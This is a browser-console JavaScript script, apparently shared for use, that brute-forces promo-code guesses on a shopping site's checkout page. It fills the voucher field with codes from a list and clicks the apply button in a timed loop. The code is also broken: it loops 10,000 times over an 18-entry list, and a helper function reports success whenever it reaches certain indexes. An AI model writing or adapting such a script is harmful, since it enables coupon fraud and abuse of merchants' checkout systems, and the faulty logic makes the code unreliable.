//Replace the var input and var button data with the one from your Page {Inspect element youll find them there.}

var input = 'opc-cart-promocode';
var button = 'osh-btn ft-apply-voucher js-throttle';

var nr = 0;
const qty = 10000;
var success = false; // Flag to indicate if the correct code is found

console.log('This Script by 31500Nfy');
var delay = prompt('Enter delay in seconds');

function main() {
  var coupon = [
  //
    '0000',
    '0001',
    '0002',
    '0137',
    '0138',
    '0139',
    '0140',
    '0141',
    '0142',
    '0143',
    '0144',
    '0145',
    '0146',
    '0147',
    '0148',
    '0149',
    '0150',
    '9999'
  ];

  if (nr !== qty && !success) {
    var inputElement = document.querySelector('input[name="' + input + '"]');
    var buttonElement = document.getElementsByClassName(button)[0];

    if (inputElement && buttonElement) {
      inputElement.value = ''; // Clear the 'pin' input field
      inputElement.value = coupon[nr]; // Set the next code
      buttonElement.click();
    } else {
      console.error('Input or button element not found.');
      return;
    }

    console.log('Tried code:', coupon[nr]); // Display each code tried

    nr++;

    // Check if success message is displayed or any indication of success
    var successElement = document.querySelector('.success-message');
    if (successElement) {
      console.log('Correct code found:', coupon[nr - 1]);
      success = true;
    } else {
      // Call the new function to test at the middle of each segment
      if (testMiddleSegments(coupon, nr)) {
        console.log('Correct code found:', coupon[nr - 1]);
        success = true;
        return;
      }

      sleep(delay, main);
    }
  } else {
    if (!success) {
      console.log('Coupon Check Finished. Correct code not found.');
    }
    return;
  }
}

// Function to test at the middle of each segment
function testMiddleSegments(coupon, nr) {
  var segmentSize = Math.floor(qty / 3);
  var middle1 = Math.floor(segmentSize / 2);
  var middle2 = segmentSize + Math.floor(segmentSize / 2);
  var middle3 = (segmentSize * 2) + Math.floor(segmentSize / 2);

  if (nr === middle1 || nr === middle2 || nr === middle3) {
    var inputElement = document.querySelector('input[name="' + input + '"]');
    var buttonElement = document.getElementsByClassName(button)[0];

    if (inputElement && buttonElement) {
      inputElement.value = ''; // Clear the 'pin' input field
      inputElement.value = coupon[nr]; // Set the next code
      buttonElement.click();
      console.log('Tried code:', coupon[nr]); // Display each code tried
      return true;
    } else {
      console.error('Input or button element not found.');
      return false;
    }
  } else {
    return false;
  }
}

function sleep(timeout, func) {
  console.log(`Waiting ${timeout} seconds...`);
  setTimeout(func, timeout * 1000);
}

main();